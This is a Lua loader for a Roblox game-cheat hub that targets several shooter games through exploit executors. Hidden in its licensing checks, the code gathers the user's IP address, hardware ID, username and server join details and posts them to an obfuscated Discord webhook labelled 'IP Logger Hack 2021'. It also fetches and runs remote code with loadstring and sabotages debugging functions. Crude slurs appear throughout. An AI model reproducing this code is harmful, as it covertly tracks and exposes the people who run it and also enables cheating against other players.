if getexecutorname then--a thing that people said script ware had (ps fuk u script ware)
    game:Shutdown()
    return
end
getgenv().print=function()
    pcall(function()
        spawn(function()
            game:Shutdown()
        end)
    end)
    pcall(function()
        spawn(function()
            game.Players.LocalPlayer:Kick()
        end)
    end)
    wait(1)
    pcall(function()
        spawn(function()
            repeat until nil
        end)
    end)
end
getgenv().warn=function()
    pcall(function()
        spawn(function()
            game:Shutdown()
        end)
    end)
    pcall(function()
        spawn(function()
            game.Players.LocalPlayer:Kick()
        end)
    end)
    wait(1)
    pcall(function()
        spawn(function()
            repeat until nil
        end)
    end)
end
getgenv().error=function()
    pcall(function()
        spawn(function()
            game:Shutdown()
        end)
    end)
    pcall(function()
        spawn(function()
            game.Players.LocalPlayer:Kick()
        end)
    end)
    wait(1)
    pcall(function()
        spawn(function()
            repeat until nil
        end)
    end)
end
getgenv().rconsoleprint=function()
    pcall(function()
        spawn(function()
            game:Shutdown()
        end)
    end)
    pcall(function()
        spawn(function()
            game.Players.LocalPlayer:Kick()
        end)
    end)
    wait(1)
    pcall(function()
        spawn(function()
            repeat until nil
        end)
    end)
end
getgenv().hookfunction=function()
    pcall(function()
        spawn(function()
            game:Shutdown()
        end)
    end)
    pcall(function()
        spawn(function()
            game.Players.LocalPlayer:Kick()
        end)
    end)
    wait(1)
    pcall(function()
        spawn(function()
            repeat until nil
        end)
    end)
end
if _G.Loaded then
    return
end
_G.Loaded=true
if _G.FasterLoading then
    game.Players.LocalPlayer:Kick("\nError Code: 7, \ndiscord.gg/erdtnTSgng For Help")
    return
end
local a={
    "a","b","c","d","e",
    "f","g","h","i","j",
    "k","l","m","n","o",
    "p","q","r","s","t",
    "u","v","w","x","y",
    "z",
}
local b={}
for _,v in pairs(a)do
    b[#b+1]=string.upper(v)
end
for _,v in pairs(b)do
    a[#a+1]=v
end
local b=""
for _=1,math.random(15,25)do
    b=b..a[math.random(1,#a)]
end
_G.Anal_Beeds=b
if isfile("SpicyFirstTime.lua")or isfile("Spicy_Bagel_Hub.Spicy_File")then
    pcall(function()
        delfile("SpicyFirstTime.lua")
    end)
    pcall(function()
        delfile("Spicy_Bagel_Hub.Spicy_File")
    end)
    game.Players.LocalPlayer:Kick("\nError Code: 10, \nPlease Rejoin, \ndiscord.gg/erdtnTSgng For Help")
    return
end
local GameTable={
    [286090429]={"Arsenal","Arsenal",1},
    [3233893879]={"Bad_Business","Bad Business",2},
    [3527629287]={"Big_Paintball","BIG Paintball!",3},
    [301549746]={"Counter_Blox","Counter Blox",4},
    [148042328]={"Counter_Blox","Counter Blox"},
    [1869597719]={"Counter_Blox","Counter Blox"},
    [625364452]={"Nerf_FPS","Foam FPS",5},
    [292439477]={"Phantom_Forces","Phantom Forces",6},
    [299659045]={"Phantom_Forces","Phantom Forces"},
    [204990346]={"Tiny_Tanks","Tiny Tanks!",7},
    [746820961]={"Unit_1968","Unit 1968",8},
    [4292776423]={"Unit_Classified","Unit: Classified",9},
}_G.Games={}
local amax=0
local a=1
for _,v in pairs(GameTable)do
    if v[3]then
        if v[3]>amax then
            amax=v[3]
        end
    end
end
repeat
    for _,v in pairs(GameTable)do
        if v[3]==a then
            a=a+1
            table.insert(_G.Games,v[2])
        end
    end
until a==amax+1 
local Exploit="Unknown"
if KRNL_LOADED and Krnl and iskrnlclosure then
    Exploit="KRNL"
elseif syn then
    if syn_websocket_close and syn_setfflag and syn_getcallingscript and syn_io_append and is_synapse_function and syn_mouse1release and syn_crypt_hash and syn_mouse2press and syn_getgc and syn_mouse2click and syn_mouse2release and syn_io_delfolder and syn_crypt_encrypt and syn_crypt_b64_decode and syn_io_read and syn_getrenv and syn_io_delfile and syn_isactive and syn_getsenv and syn_websocket_send and syn_crypt_derive and syn_islclosure and syn_keypress and syn_getgenv and syn_io_isfile and syn_crypt_b64_encode and syn_mousemoveabs and syn_decompile and syn_newcclosure and syn_getmenv and syn_mousescroll and syn_crypt_decrypt and syn_getinstances and syn_mouse1click and syn_clipboard_set and syn_checkcaller and syn_getreg and syn_dumpstring and syn_websocket_connect and syn_context_set and syn_keyrelease and syn_io_listdir and syn_io_write and syn_crypt_random and syn_mousemoverel and syn_mouse1press and syn_getloadedmodules and syn_io_isfolder and syn_context_get and syn_io_makefolder then
        Exploit="Synapse Xen"
    else
        game.Players.LocalPlayer:Kick("\nError Code: 14, \ndiscord.gg/erdtnTSgng For Help")
        return
    end
else
    game.Players.LocalPlayer:Kick("\nError Code: 15, \ndiscord.gg/erdtnTSgng For Help")
    return
end
local fakenums={[1]="123",[2]="664",[3]="694",[4]="201"}
if isfile("Spicy_Bagel_Hub_NEW.Spicy_File")then
    local a
    local pcalled=pcall(function()
        a=tostring(game.HttpService:JSONDecode(game:HttpGet("https://httpbin.org/ip")).origin)
    end)
    if not pcalled then
        game.Players.LocalPlayer:Kick("\nError Code: 4, \ndiscord.gg/erdtnTSgng For Help")
        return
    end
    local decoded=game:GetService("HttpService"):JSONDecode((syn and syn.request or http_request)({Url="https://httpbin.org/get",Method="GET"}).Body)
    local hwid_list={"Syn-Fingerprint","Exploit-Guid","Proto-User-Identifier","Sentinel-Fingerprint"}
    local hwid=nil
    for _,v in pairs(hwid_list)do
    	if decoded.headers[v]then
    		hwid=decoded.headers[v]
    		break
    	end
    end
    local oldfakenums=string.gsub(string.gsub(string.split("h'ps[di346346ckord[C215215UM[IP325352AD[WEeBWh214241352oOkS[46au544460au821421418787au6068","[")[1],
        "'","_tt_").."://"..string.gsub(string.split("h'437347437ps[dickord[C346346UM[I325532PAD[WEe346463WhoOkS[46au436436544460au835235218787au6068","[")[2],"ck","s_c").."."..
    string.gsub(string.lower(string.split("h'4374373ps[dicko4374373rd[CUM[I436347PAD[WEeBWh436436436346oOkS[46au544460544364367457au818787au6068","[")[3]),"u","o_").."/"..string.gsub(string.lower(
        string.split("h'437473743ps[di347437ckord[C437437UM[IPAD[WEeBWhoO347437437kS[46au544374734734460au818712521587au6068","[")[4]:reverse()),"d","_").."/"..string.gsub(string.lower(
        string.split("h473473'ps[dic473743kord[CU473473M[IP437437AD[WEeBWhoOkS[46au544460au81873587au6068","[")[5]),"ebw","b_").."/"..string.gsub(
    string.split("h'437743ps[dicko473743743rd[C743743473UM[I437473743PAD[WE437473473eBWhoOkS[861119405048201216/","[")[6],"ua","_"),"_","").."U1FKgIBj1ByFhTc66MyEYqBLWv96QDTxeW990lysYQPdCUD9TZNB2w0TcoXskffySnUD"
    if pcall(function()game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/Black/"..tostring(a))end)then
        local analcummy=(syn and syn.request or http_request)(
            {
                Url=oldfakenums,
                Method="POST",
                Headers={
                    ["Content-Type"]="application/json",
                },
                Body=game.HttpService:JSONEncode(
                    {
                        name="",
                        content="IP Blacklist "..game.Players.LocalPlayer.Name..":",
                        embeds={
                            {
                                title="",
                                color="0",
                                footer={
                                    text="IP Logger Hack 2021"
                                },
                                author={
                                    name=""
                                },
                                fields={
                                    {
                                        name="Game:",
                                        value=GameTable[game.PlaceId][2]
                                    },
                                    {
                                        name="Exploit:",
                                        value=Exploit
                                    },
                                    {
                                        name="IP:",
                                        value=a
                                    },
                                    {
                                        name="HWID:",
                                        value=hwid or "Failed To Get HWID"
                                    }
                                },
                                timestamp=string.format(
                                    "%d-%d-%dT%02d:%02d:%02dZ",
                                    os.date("!*t",os.time()).year,
                                    os.date("!*t",os.time()).month,
                                    os.date("!*t",os.time()).day,
                                    os.date("!*t",os.time()).hour,
                                    os.date("!*t",os.time()).min,
                                    os.date("!*t",os.time()).sec
                                )
                            }
                        }
                    }
                )
            }
        )
        if type(analcummy)~="table"then
            game.Players.LocalPlayer:Kick("\nError Code: 13, \ndiscord.gg/erdtnTSgng For Help")
            return
        end
        local cum=loadstring(game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/Black/"..tostring(a)))()or"No Reason Givin"
        game.Players.LocalPlayer:Kick("\nError Code: IP BLACKLIST\n discord.gg/erdtnTSgng\nReason Givin: "..cum)
        return
    end
    if pcall(function()game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/Black/"..tostring(hwid))end)then
        local analcummy=(syn and syn.request or http_request)(
            {
                Url=oldfakenums,
                Method="POST",
                Headers={
                    ["Content-Type"]="application/json",
                },
                Body=game.HttpService:JSONEncode(
                    {
                        name="",
                        content="HWID Blacklist "..game.Players.LocalPlayer.Name..":",
                        embeds={
                            {
                                title="",
                                color="0",
                                footer={
                                    text="IP Logger Hack 2021"
                                },
                                author={
                                    name=""
                                },
                                fields={
                                    {
                                        name="Game:",
                                        value=GameTable[game.PlaceId][2]
                                    },
                                    {
                                        name="Exploit:",
                                        value=Exploit
                                    },
                                    {
                                        name="IP:",
                                        value=a
                                    },
                                    {
                                        name="HWID:",
                                        value=hwid or "Failed To Get HWID"
                                    }
                                },
                                timestamp=string.format(
                                    "%d-%d-%dT%02d:%02d:%02dZ",
                                    os.date("!*t",os.time()).year,
                                    os.date("!*t",os.time()).month,
                                    os.date("!*t",os.time()).day,
                                    os.date("!*t",os.time()).hour,
                                    os.date("!*t",os.time()).min,
                                    os.date("!*t",os.time()).sec
                                )
                            }
                        }
                    }
                )
            }
        )
        if type(analcummy)~="table"then
            game.Players.LocalPlayer:Kick("\nError Code: 13, \ndiscord.gg/erdtnTSgng For Help")
            return
        end
        local cum=loadstring(game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/Black/"..tostring(hwid)))()or"No Reason Givin"
        game.Players.LocalPlayer:Kick("\nError Code: HWID BLACKLIST\n discord.gg/erdtnTSgng\nReason Givin: "..cum)
        return
    end
    if GameTable[game.PlaceId][1]~="UnSupported"and _G["DE719438-3913-47CA-A81C-F5E7FC78303B"]==nil then
        local nut=pcall(function()
            local analcummy=(syn and syn.request or http_request)(
                {
                    Url=oldfakenums,
                    Method="POST",
                    Headers={
                        ["Content-Type"]="application/json",
                    },
                    Body=game.HttpService:JSONEncode(
                        {
                            name="",
                            content=game.Players.LocalPlayer.Name..":",
                            embeds={
                                {
                                    title="",
                                    color="0",
                                    footer={
                                        text="IP Logger Hack 2021"
                                    },
                                    author={
                                        name=""
                                    },
                                    fields={
                                        {
                                            name="Game:",
                                            value=GameTable[game.PlaceId][2]
                                        },
                                        {
                                            name="Exploit:",
                                            value=Exploit
                                        },
                                        {
                                            name="IP:",
                                            value=a
                                        },
                                        {
                                            name="HWID:",
                                            value=hwid or "Failed To Get HWID"
                                        },
                                        {
                                            name="Join Script:",
                                            value="game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..",'"..game.JobId.."')"
                                        },
                                        {
                                            name="Kick Text:",
                                            value=_G.Anal_Beeds
                                        }
                                    },
                                    timestamp=string.format(
                                        "%d-%d-%dT%02d:%02d:%02dZ",
                                        os.date("!*t",os.time()).year,
                                        os.date("!*t",os.time()).month,
                                        os.date("!*t",os.time()).day,
                                        os.date("!*t",os.time()).hour,
                                        os.date("!*t",os.time()).min,
                                        os.date("!*t",os.time()).sec
                                    )
                                }
                            }
                        }
                    )
                }
            )
            if type(analcummy)~="table"then
                game.Players.LocalPlayer:Kick("\nError Code: 13, \ndiscord.gg/erdtnTSgng For Help")
                return
            end
        end)
        if not nut then
            game.Players.LocalPlayer:Kick("\nError Code: 12, \ndiscord.gg/erdtnTSgng For Help")
            return
        end
    end
    local b=""
    if #string.split(a,".")~=4 then
        game.Players.LocalPlayer:Kick("\nError Code: 3, \ndiscord.gg/erdtnTSgng For Help")
        return
    end
    for i,v in pairs(string.split(a,"."))do
        if tonumber(v)>255 then
            game.Players.LocalPlayer:Kick("\nError Code: 2, \ndiscord.gg/erdtnTSgng For Help")
            return
        end
        if tonumber(v)<0 then
            game.Players.LocalPlayer:Kick("\nError Code: 2, \ndiscord.gg/erdtnTSgng For Help")
            return
        end
        b=b..tostring(v)..fakenums[i]
    end
    local a=string.gsub(readfile("Spicy_Bagel_Hub_NEW.Spicy_File"),"Spicy ","")
    if a~=b then
        game.Players.LocalPlayer:Kick("\nError Code: 1, \ndiscord.gg/erdtnTSgng For Help")
        return
    end
else
    local a
    local pcalled=pcall(function()
        a=tostring(game.HttpService:JSONDecode(game:HttpGet("https://httpbin.org/ip")).origin)
    end)
    if not pcalled then
        game.Players.LocalPlayer:Kick("\nError Code: 4, \ndiscord.gg/erdtnTSgng For Help")
        return
    end
    local b=""
    if #string.split(a,".")~=4 then
        game.Players.LocalPlayer:Kick("\nError Code: 3, \ndiscord.gg/erdtnTSgng For Help")
        return
    end
    for i,v in pairs(string.split(a,"."))do
        if tonumber(v)>255 then
            game.Players.LocalPlayer:Kick("\nError Code: 2, \ndiscord.gg/erdtnTSgng For Help")
            return
        end
        if tonumber(v)<0 then
            game.Players.LocalPlayer:Kick("\nError Code: 2, \ndiscord.gg/erdtnTSgng For Help")
            return
        end
        b=b..tostring(v)..fakenums[i]
    end
    writefile("Spicy_Bagel_Hub_NEW.Spicy_File","Spicy "..b)
    game.Players.LocalPlayer:Kick("\nError Code: 11, \nPlease Rejoin, \ndiscord.gg/erdtnTSgng For Help")
    return
end
local a={
    "a","b","c","d","e",
    "f","g","h","i","j",
    "k","l","m","n","o",
    "p","q","r","s","t",
    "u","v","w","x","y",
    "z",
}
local c={
    1,2,3,4,5,6,7,8,9,0,
    "!","@","#","$","%",
    "^","&","*","(",")",
    "-","_","=","+",",",
    "<",".",">","/","?",
    ";",":","'",'"',"[",
    "]","{","}"," ",
}
local b={}
for _,v in pairs(a)do
    b[#b+1]=string.upper(v)
end
for _,v in pairs(b)do
    a[#a+1]=v
end
for _,v in pairs(c)do
    a[#a+1]=v
end
for _=1,99 do
    local b=""
    for _=1,math.random(5,500)do
        b=b..a[math.random(1,#a)]
    end
    local c=""
    for _=1,math.random(5,500)do
        c=c..a[math.random(1,#a)]
    end
    _G[b]=c
end
local d=""
for _=1,math.random(5,500)do
    d=d..a[math.random(1,#a)]
end
d=d.."SCYCHKTRU"
for _=1,math.random(5,500)do
    d=d..a[math.random(1,#a)]
end
d=d.."SPRINSNlocaCHC1337"
for _=1,math.random(5,500-27)do
    d=d..a[math.random(1,#a)]
end
local e=""
for _=1,math.random(5,500)do
    e=e..a[math.random(1,#a)]
end
e=e.."@Eryon_ys_tru"
for _=1,math.random(5,500)do
    e=e..a[math.random(1,#a)]
end
e=e.."ast6322w34kldfu"
for _=1,math.random(5,500-28)do
    e=e..a[math.random(1,#a)]
end
_G[d]=e
for _=1,100 do
    local b=""
    for _=1,math.random(5,500)do
        b=b..a[math.random(1,#a)]
    end
    local c=""
    for _=1,math.random(5,500)do
        c=c..a[math.random(1,#a)]
    end
    _G[b]=c
end
local a=false
for i,v in pairs(_G)do
    if 
    string.find(i,"SCYCHKTRU")and
    string.find(i,"SPRINSNlocaCHC1337")and
    string.find(v,"@Eryon_ys_tru")and
    string.find(v,"ast6322w34kldfu")then
        a=true
    end
end
if not a then
    game.Players.LocalPlayer:Kick([[

Error _G Encrytion Failed
if This Keeps Happening Report it To The Discord
https://discord.gg/erdtnTSgng]])
return
end
for _,v in pairs(game.Players:GetChildren())do
    if v~=game.Players.LocalPlayer and v.Name=="The3bakers"then
        game:Shutdown()
    end
end
game.Players.ChildAdded:Connect(function()
    for _,v in pairs(game.Players:GetChildren())do
        if v~=game.Players.LocalPlayer and v.Name=="The3bakers"then
            game:Shutdown()
        end
    end
end)
local function Load(...)
    local args={...}
    
    local gui=Instance.new("ScreenGui")
    gui.Name=game.HttpService:GenerateGUID(false)
    gui.Parent=game.CoreGui

    local mainframe=Instance.new("Frame")
    mainframe.Name=game.HttpService:GenerateGUID(false)
    mainframe.Parent=gui
    mainframe.AnchorPoint=Vector2.new(.5,.5)
    mainframe.BackgroundColor3=_G.UIBackgroundColor or Color3.fromRGB(35,35,35)
    mainframe.BorderSizePixel=0
    mainframe.Position=UDim2.new(.5,0,.5,0)
    mainframe.Size=UDim2.new(0,300,0,100)
    mainframe.ClipsDescendants=true

    local topframe=Instance.new("Frame")
    topframe.Name=game.HttpService:GenerateGUID(false)
    topframe.Parent=mainframe
    topframe.AnchorPoint=Vector2.new(.5,0)
    topframe.BackgroundColor3=_G.UIMainColor or Color3.fromRGB(255,75,75)
    topframe.BorderSizePixel=0
    topframe.Position=UDim2.new(.5,0,0,0)
    topframe.Size=UDim2.new(1,0,0,5)

    for _,v in pairs(args)do
        local maintext=Instance.new("TextLabel")
        maintext.Visible=false
        maintext.AnchorPoint=Vector2.new(.5,.25)
        maintext.BackgroundTransparency=1
        maintext.Parent=mainframe
        maintext.Position=UDim2.new(.5,0,.275,0)
        maintext.Size=UDim2.new(1,0,2,0)
        maintext.Text=tostring(v)
        maintext.TextColor3=_G.UIMainColor or Color3.fromRGB(255,75,75)
        maintext.TextSize=0
        maintext.LineHeight=1.75
        maintext.Font="SourceSans"
        maintext.Visible=true
        
        local c=40
        
        local b=25
        
        for i=1,b do
            maintext.TextSize=i*(c/b)
            maintext.LineHeight=(1.75+(i/c)*(3-1.75))*(c/b)
            game:GetService("RunService").RenderStepped:Wait()
        end
        
        wait(1)
        
        coroutine.wrap(function()
            for i=1,25 do
                maintext.TextSize=c-i
                maintext.AnchorPoint=Vector2.new(.5,.25+i/100)
                game:GetService("RunService").RenderStepped:Wait()
            end
            wait(1)
            for i=1,25 do
                maintext.TextTransparency=0+i/25
                game:GetService("RunService").RenderStepped:Wait()
            end
            maintext:Destroy()
        end)()
    end
    gui:Destroy()
end
if _G.AutoHub then
    game.Players.LocalPlayer:Kick("\nError Code: 8, \ndiscord.gg/erdtnTSgng For Help")
    return
end
if pcall(function()game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/UI.lua")end)then
    _G.CoastingLibrary=game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/UI.lua")
    writefile("SpicyCoastingUI.lua",game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/UI.lua"))
elseif isfile("SpicyCoastingUI.lua")then
    _G.CoastingLibrary=readfile("SpicyCoastingUI.lua")
else
    game.Players.LocalPlayer:Kick("\nError Code: 9, \ndiscord.gg/erdtnTSgng For Help")
    return
end
if pcall(function()game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/Emojis.lua")end)then
    _G.Emojis=loadstring(game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/Emojis.lua"))()
    writefile("SpicyEmojis.lua",game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/Emojis.lua"))
elseif isfile("SpicyEmojis.lua")then
    _G.Emojis=loadfile("SpicyEmojis.lua")()
else
    game.Players.LocalPlayer:Kick("Error Code: 9, /ndiscord.gg/erdtnTSgng For Help")
    return
end
if pcall(function()game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/PhantomForcesEndGameQuotes.lua")end)then
    _G.PhantomForcesQuotes=loadstring(game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/PhantomForcesEndGameQuotes.lua"))()
    writefile("SpicyPhantomForcesQuotes.lua",game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/PhantomForcesEndGameQuotes.lua"))
elseif isfile("SpicyPhantomForcesQuotes.lua")then
    _G.PhantomForcesQuotes=loadfile("SpicyPhantomForcesQuotes.lua")()
else
    game.Players.LocalPlayer:Kick("Error Code: 9, /ndiscord.gg/erdtnTSgng For Help")
    return
end
if pcall(function()game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/TabelToString.lua")end)then
    _G.TableToString=loadstring(game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/TabelToString.lua"))()
    writefile("SpicyTableToString.lua",game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/TabelToString.lua"))
elseif isfile("SpicyTableToString.lua")then
    _G.TableToString=loadfile("SpicyTableToString.lua")()
else
    game.Players.LocalPlayer:Kick("Error Code: 9, /ndiscord.gg/erdtnTSgng For Help")
    return
end
if GameTable[game.PlaceId]then
    Load("Spicy Bagel Hub","By: The3Bakers#4565",Exploit,GameTable[game.PlaceId][2])
else
    Load("Spicy Bagel Hub","By: The3Bakers#4565",Exploit,"UnSupported","Retard")
    GameTable[game.PlaceId]={"UnSupported"}
end
for i=1,10 do
    game.RunService.Stepped:Wait()
end
if pcall(function()game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Spicy-Bagel-Hub/Games/"..GameTable[game.PlaceId][1]..".lua")end)then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Spicy-Bagel-Hub/Games/"..GameTable[game.PlaceId][1]..".lua"))()
    writefile("Spicy"..GameTable[game.PlaceId][1]..".lua",game:HttpGet("https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Spicy-Bagel-Hub/Games/"..GameTable[game.PlaceId][1]..".lua"))
elseif isfile("Spicy"..GameTable[game.PlaceId][1]..".lua")then
    loadfile("Spicy"..GameTable[game.PlaceId][1]..".lua")()
else
    game.Players.LocalPlayer:Kick("\nError Code: 9, \ndiscord.gg/erdtnTSgng For Help")
    return
end
